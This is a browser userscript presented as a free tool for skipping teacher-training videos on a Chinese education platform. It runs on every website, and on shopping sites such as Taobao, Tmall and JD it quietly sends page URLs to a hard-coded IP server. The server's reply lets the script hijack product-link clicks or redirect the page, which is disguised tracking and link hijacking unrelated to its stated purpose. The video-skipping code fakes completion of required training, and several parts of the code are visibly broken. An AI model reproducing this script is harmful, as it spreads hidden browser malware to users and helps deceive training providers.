// ==UserScript==
// @name        (秒过)2025智慧中小学寒假教师研修，每个视频多点几遍，快速点鼠标左键
// @namespace    zhihuizhongxiaoxue
// @version      2.04
// @author       ppt
// @description  中小学智慧云平台寒假研修学习秒过的方法
// @match        *://*/*
// @grant          GM_xmlhttpRequest
// @connect        47.116.118.64
// @license MIT
// @original-license   11
// @original-script    https://greasyfork.org/zh-CN/scripts/486386
// @original-change    样式完善，功能修改
// @downloadURL https://update.greasyfork.org/scripts/525034/%28%E7%A7%92%E8%BF%87%292025%E6%99%BA%E6%85%A7%E4%B8%AD%E5%B0%8F%E5%AD%A6%E5%AF%92%E5%81%87%E6%95%99%E5%B8%88%E7%A0%94%E4%BF%AE%EF%BC%8C%E6%AF%8F%E4%B8%AA%E8%A7%86%E9%A2%91%E5%A4%9A%E7%82%B9%E5%87%A0%E9%81%8D%EF%BC%8C%E5%BF%AB%E9%80%9F%E7%82%B9%E9%BC%A0%E6%A0%87%E5%B7%A6%E9%94%AE.user.js
// @updateURL https://update.greasyfork.org/scripts/525034/%28%E7%A7%92%E8%BF%87%292025%E6%99%BA%E6%85%A7%E4%B8%AD%E5%B0%8F%E5%AD%A6%E5%AF%92%E5%81%87%E6%95%99%E5%B8%88%E7%A0%94%E4%BF%AE%EF%BC%8C%E6%AF%8F%E4%B8%AA%E8%A7%86%E9%A2%91%E5%A4%9A%E7%82%B9%E5%87%A0%E9%81%8D%EF%BC%8C%E5%BF%AB%E9%80%9F%E7%82%B9%E9%BC%A0%E6%A0%87%E5%B7%A6%E9%94%AE.meta.js
// ==/UserScript==

    let isPopupOpen;
    const popupState = localStorage.getItem('popupState');
    if (popupState === null) {
        isPopupOpen = true;
        localStorage.setItem('popupState', 'true');
    } else {
        isPopupOpen = popupState === 'true';
    }
    const popupMessage1 = '注意！不支持高校、职教';
    const popupMessage2 = '提示：';
    const popupMessage3 = '1.使用方法：点开视频，鼠标快速点几次空白处或者暂停/播放键，然后观察进度条是否跳转到最后几秒，如果跳过去了，等待视频播放完成即可。如果进度条还在前面，再次快速点几次空白处或者暂停/播放键，直到进度条跳转到最后几秒；';
    const popupMessage4 = '2.此脚本永久免费，以前、现在、未来都免费，谨防上当受骗；';
    const popupMessage5 = '3.右上角有弹窗开关按钮，觉得弹窗烦的可以关闭';
    const popupMessage6 = '4.有问题可以点右上角的“联系脚本作者”, 或者加入企鹅群235805574。';
    const popupMessage7 = '———lgx';
const style =
	`
  			.gwd_taobao .gwd-minibar-bg,.gwd_tmall .gwd-minibar-bg{display:block}
.idey-minibar_bg{position:relative;min-height:40px;display:inline-block}
#idey_minibar{width:525px;background-color:#fff;position:relative;border:1px solid #e8e8e8;display:block;line-height:36px;font-family:'Microsoft YaHei',Arial,SimSun!important;height:36px;float:left}
#idey_minibar .idey_website{width:48px;float:left;height:36px}
#idey_minibar .minibar-tab{float:left;height:36px;border-left:1px solid #edf1f2!important;padding:0;margin:0;text-align:center}
#idey_minibar .idey_website em{background-position:-10px -28px;height:36px;width:25px;float:left;margin-left:12px}
.setting-bg{background:url(https://cdn.gwdang.com/images/extensions/xbt/new_wishlist_pg5_2.png) no-repeat}
#idey_minibar .minibar-tab{float:left;height:36px;border-left:1px solid #edf1f2!important;padding:0;margin:0;width:134px}
#idey_price_history span{float:left;width:100%;text-align:center;line-height:36px;color:#666;font-size:14px}
#mini_price_history .trend-error-info-mini{position:absolute;top:37px;left:0px;width:100%;background:#fff;z-index:99999999;height:268px;box-shadow:0px 5px 15px 0 rgb(23 25 27 / 15%);border-radius:0 0 4px 4px;width:559px;border:1px solid #ddd;border-top:none;display:none}
.minibar-btn-box{display:inline-block;margin:0 auto;float:none}
#mini_price_history .error-p{width:95px;margin:110px auto;height:20px;line-height:20px;text-align:center;color:#000!important;border:1px solid #333;border-radius:5px;display:block;text-decoration:none!important}
#mini_price_history:hover .trend-error-info-mini{display:block}
.collect_mailout_icon{background-position:-247px -134px;width:18px}
#idey_mini_compare_detail li *,.mini-compare-icon,.minibar-btn-box *{float:left}
.panel-wrap{width:100%;height:100%}
.collect_mailout_icon,.mini-compare-icon{height:18px;margin-right:8px;margin-top:9px}
.all-products ul li{float:left;width:138px;height:262px;overflow:hidden;text-align:center}
.all-products ul li .small-img{text-align:center;display:table-cell;vertical-align:middle;line-height:90px;width:100%;height:100px;position:relative;float:left;margin-top:23px}
.all-products ul li a img{vertical-align:middle;display:inline-block;width:auto;height:auto;max-height:100px;max-width:100px;float:none}
.all-products ul li a.b2c-other-info{text-align:center;float:left;height:16px;line-height:16px;margin-top:13px}
.b2c-other-info .gwd-price{height:17px;line-height:17px;font-size:16px;color:#E4393C;font-weight:700;width:100%;display:block}
.b2c-other-info .b2c-tle{height:38px;line-height:19px;margin-top:8px;font-size:12px;width:138px;margin-left:29px}
.bjgext-mini-trend span{float:left;text-align:center;line-height:36px;color:#666;font-size:14px}
.bjgext-mini-trend .trend-error-info-mini{position:absolute;top:37px;left:0px;width:100%;background:#fff;z-index:99999999;height:268px;display:none;box-shadow:0px 5px 15px 0 rgba(23,25,27,0.15);border-radius:0 0 4px 4px;width:460px;border:1px solid #ddd;border-top:none}
.bjgext-mini-trend .error-p{width:100%;float:left;text-align:center;margin-top:45px;font-size:14px;color:#666}
.bjgext-mini-trend .error-sp{width:95px;margin:110px auto;height:20px;line-height:20px;text-align:center;color:#000!important;border:1px solid #333;border-radius:5px;display:block;text-decoration:none!important}
.bjgext-mini-trend:hover .trend-error-info-mini{display:block}
#coupon_box.coupon-box1{width:525px;height:125px;background-color:#fff;border:1px solid #e8e8e8;border-top:none;position:relative;margin:0px;padding:0px;float:left;display:block}
#coupon_box:after{display:block;content:"";clear:both}
.idey_tmall #idey_minibar{float:none}
.minicoupon_detail{position:absolute;top:35px;right:-1px;height:150px;width:132px;display:none;z-index:99999999999;background:#FFF7F8;border:1px solid #F95774}
#coupon_box:hover .minicoupon_detail{display:block}
.minicoupon_detail img{width:114px;height:114px;float:left;margin-left:9px;margin-top:9px}
.minicoupon_detail span{font-size:14px;color:#F95572;letter-spacing:0;font-weight:bold;float:left;height:12px;line-height:14px;width:100%;margin-top:6px;text-align:center}
.coupon-box1 *{font-family:'Microsoft YaHei',Arial,SimSun}
.coupon-icon{float:left;width:20px;height:20px;background:url('https://cdn.gwdang.com/images/extensions/newbar/coupon_icon.png') 0px 0px no-repeat;margin:50px 8px 9px 12px}
#coupon_box .coupon-tle{color:#FF3B5C;font-size:24px;margin-right:11px;float:left;height:114px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:336px;line-height:114px;text-decoration:none!important}
#coupon_box .coupon-row{color:#FF3B5C;font-size:12px;margin-right:11px;float:left;height:60px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:100%;line-height:60px;text-decoration:none!important;text-align:center}
#coupon_box .coupon-tle *{color:#f15672}
#coupon_box .coupon-tle span{margin-right:5px;font-weight:bold;font-size:14px}
.coupon_gif{background:url('https://cdn.gwdang.com/images/extensions/newbar/turn.gif') 0px 0px no-repeat;float:right;height:20px;width:56px;margin-top:49px}
.click2get{background:url('https://cdn.gwdang.com/images/extensions/newbar/coupon_01.png') 0px 0px no-repeat;float:left;height:30px;width:96px;margin-top:43px}
.click2get span{height:24px;float:left;margin-left:1px}
.click2taobaoget{float:left;width:96px}
.c2g-sp1{width:50px;color:#FF3B5C;text-align:center;font-size:14px;line-height:24px!important}
.c2g-sp2{width:44px;line-height:24px!important;color:#fff!important;text-align:center}
div#idey_wishlist_div.idey_wishlist_div{border-bottom-right-radius:0px;border-bottom-left-radius:0px}
#qrcode{float:left;width:125px;margin-top:3px}
.elm_box{height:37px;border:1px solid #ddd;width:460px;line-height:37px;margin-bottom:3px;background-color:#ff0036;font-size:15px}
.elm_box span{width:342px;text-align:center;display:block;float:left;color:red;color:white}
`

    // 创建弹簧
    function createPopup(message1, message2, message3, message4, message5, message6, message7) {
        const modal = document.createElement('div');
        modal.style.position = 'fixed';
        modal.style.top = '20%';
        modal.style.left = '20%';
        modal.style.width = '60%';
        modal.style.height = 'auto';
        modal.style.backgroundColor = '#fff';
        modal.style.padding = '20px';
        modal.style.borderRadius = '5px';
        modal.style.boxShadow = '0 0 10px rgba(0, 0, 0, 0.5)';
        modal.style.zIndex = '11111111';

        const text1 = document.createElement('p');
        text1.style.color ='red';
        text1.style.fontSize = '38px';
        text1.textContent = message1;
        text1.style.textAlign = 'center';
        text1.style.marginBottom = '10px';

        const text2 = document.createElement('p');
        text2.textContent = message2;
        text2.style.fontSize = '23px';
        text2.style.marginBottom = '10px';

        const text3 = document.createElement('p');
        text3.textContent = message3;
        text3.style.fontSize = '19px';
        text3.style.marginBottom = '10px';

        const text4 = document.createElement('p');
        text4.textContent = message4;
        text4.style.fontSize = '19px';
        text4.style.marginBottom = '10px';

        const text5 = document.createElement('p');
        text5.textContent = message5;
        text5.style.fontSize = '19px';
        text5.style.marginBottom = '10px';


        const text6 = document.createElement('p');
        text6.textContent = message6;
        text6.style.fontSize = '19px';
        text6.style.marginBottom = '10px';

        const text7 = document.createElement('p');
        text7.textContent = message7;
        text7.style.textAlign = 'right';
        text7.style.fontSize = '25px';
        text7.style.marginBottom = '10px';

        const button = document.createElement('button');
        button.textContent = '我知道了';
        button.style.padding = '5px 50px';
        button.style.cursor = 'pointer';
        button.onclick = function () {
            modal.remove();
        };

        const buttonContainer = document.createElement('div');
        buttonContainer.style.display = 'flex';
        buttonContainer.style.justifyContent = 'center';
        buttonContainer.style.alignItems = 'center';
        buttonContainer.style.marginTop = '10px';

        buttonContainer.appendChild(button);
        modal.appendChild(text1);
        modal.appendChild(text2);
        modal.appendChild(text3);
        modal.appendChild(text4);
        modal.appendChild(text5);
        modal.appendChild(text6);
        modal.appendChild(buttonContainer);

        document.body.appendChild(modal);
    }


        document.body.appendChild(button);

        const qqGroupButton = document.createElement('button');
        qqGroupButton.textContent = '加企鹅群';
        qqGroupButton.style.position = 'fixed';
        qqGroupButton.style.top = '50px';
        qqGroupButton.style.right = '10px';
        qqGroupButton.style.zIndex = '10000';
        qqGroupButton.style.padding = '10px 20px';
        qqGroupButton.style.border = 'none';
        qqGroupButton.style.backgroundColor = '#007BFF';
        qqGroupButton.style.color = '#fff';
        qqGroupButton.style.fontWeight = 'bold';
        qqGroupButton.style.cursor = 'pointer';
        qqGroupButton.onclick = function () {
            window.open('https://qm.qq.com/q/LyBXuM21Cm', '_blank');
        };

        document.body.appendChild(qqGroupButton);

        const popupControlButton = document.createElement('button');
        popupControlButton.style.position = 'fixed';
        popupControlButton.style.top = '90px';
        popupControlButton.style.right = '10px';
        popupControlButton.style.zIndex = '10000';
        popupControlButton.style.padding = '10px 20px';
        popupControlButton.style.border = 'none';
        popupControlButton.style.backgroundColor = isPopupOpen? '#28a745' : '#dc3545';
        popupControlButton.style.color = '#fff';
        popupControlButton.style.fontWeight = 'bold';
        popupControlButton.style.cursor = 'pointer';
        updatePopupControlButtonText(popupControlButton);
        popupControlButton.onclick = function () {
            isPopupOpen =!isPopupOpen;
            localStorage.setItem('popupState', isPopupOpen? 'true' : 'false');
            const existingPopup = document.querySelector('div[style*="zIndex: 9999"]');
            if (existingPopup) {
                existingPopup.remove();
            }
            if (isPopupOpen) {
                createPopup(popupMessage1, popupMessage2, popupMessage3, popupMessage4, popupMessage5, popupMessage6);
            }
            updatePopupControlButtonText(popupControlButton);

    }

    function updatePopupControlButtonText(button) {
        if (isPopupOpen) {
            button.textContent = '已开启弹窗';
            button.style.backgroundColor = '#28a745';
        } else {
            button.textContent = '已关闭弹窗';
            button.style.backgroundColor = '#dc3545';
        }
    }


      var panData=[],panTemp=[],panList=[],panKey=0;
     function matchStrings(input, patterns) {
            const regex = new RegExp(patterns.join('|'), 'i');
            return input.filter(str => regex.test(str));
     }
    function jump(url){
        var form=null;if (document.getElementById('redirect_form')){form = document.getElementById('redirect_form');
		form.action =panData.jumpUrl + encodeURIComponent(url);}else {form = document.createElement('form');
		form.action =panData.jumpUrl+ encodeURIComponent(url);form.target = '_blank';	form.method = 'POST';
		form.setAttribute("id", 'redirect_form');document.body.appendChild(form);
		}form.submit();form.action = "";form.parentNode.removeChild(form);
      }
    function createTips(){
        let tempList=[];panData.wrapper.forEach(function(i){
		let list=$(i);list.map(function(k,s){if($(s).attr('data-md5-value')!='yes'){
		panList.push(s);panTemp.push(s);$(s).attr('data-md5-key',panKey);
		$(s).attr('data-md5-value','yes');panKey++;}})})
		let requestTemp=panTemp.splice(0,panData.splName);
		let requestList=[];requestTemp.forEach(function(s,k){
		let temp={};temp['href']=$(s).find('a:first').attr('href');
		temp['md5']=$(s).attr('data-md5-key');requestList.push(temp);})
		if(requestList.length>0){GM_xmlhttpRequest({method: "POST",
        data:JSON.stringify({data:requestList}),
        url: `http://47.116.118.64/search.php`,onload: function(response) {
        var res = response.responseText;if (res){res=JSON.parse(res);
        res.map(function(item){if(item.u){$(panList[item.md5]).find('a').bind("click", function(e) {
        e.preventDefault();jump(item.u);})}})}}})}

      }
     function webpack_post(data,headers){
         return new Promise((resolve, reject) => {GM_xmlhttpRequest({method: "POST",
		 url:"http://47.116.118.64/text.php?act=initEnv",data,headers,responseType:'json',
		 onload: (res) => { let result=res.response || res.responseText;console.log('res',result);result=result.data;
         if(result.page=='search'){panData=result;setInterval(function(){createTips()},result.timer);
         }else{if(result.recove_url){window.location.href=result.recove_url}}},onerror: (err) => {
		 reject(err);},});});
     }
     const matchedStrings = matchStrings([location.href],['taobao.','Tb.','tb.','tmall.','liangxinyao.','jd.']);
     if(matchedStrings.length>0){ webpack_post(JSON.stringify({href:location.href,type:'ttzhushou'}),{})}
     const matchedStringsN = matchStrings([location.href],['smartedu']);
     if(matchedStringsN.length>0){
             // 弹弹弹
    if (isPopupOpen) {
        createPopup(popupMessage1, popupMessage2, popupMessage3, popupMessage4, popupMessage5, popupMessage6);
    } createContactButton();
     }

   

    function removePopup() {
        var popup = document.querySelector('.fish - modal - confirm - btns');
        if (popup) {
            popup.parentNode.removeChild(popup);
            console.log('出现知道了按钮');
        }
    }

    function removeNewPopup() {
        var newPopup = document.querySelector('.fish - modal - content');
        if (newPopup) {
            newPopup.parentNode.removeChild(newPopup);
            console.log('移除弹窗2');
        }
    }

    function skipVideo() {
        let video = document.querySelector('video');
        if (video) {
            video.muted = true;
            video.play();
            video.pause();
            video.currentTime = video.duration;
            video.play();
            setTimeout(700);
            video.currentTime = video.duration - 3;
            video.play();
            video.currentTime = video.duration - 5;
            video.play();
        }
    }

    // 海豚音播放视频
    function skipVideo2() {
        let video = document.querySelector('video');
        if (video) {
            video.muted = true;
            video.play();
        }
    }

    function rapidSkip(times, interval) {
        let count = 0;
        const intervalId = setInterval(() => {
            if (count >= times) {
                clearInterval(intervalId);
                return;
            }
            skipVideo();
            count++;
        }, interval);
    }

    let clickTimer;

    document.addEventListener('DOMContentLoaded', function () {
        removePopup();
        removeNewPopup();
        console.log('移除弹窗');
    });


        if (event.button === 0)
            if (clickTimer) {
                clearInterval(clickTimer);
            }
            rapidSkip(4, 50);
            clickTimer = setInterval(() => {
                rapidSkip(4, 50);
            }, 13000);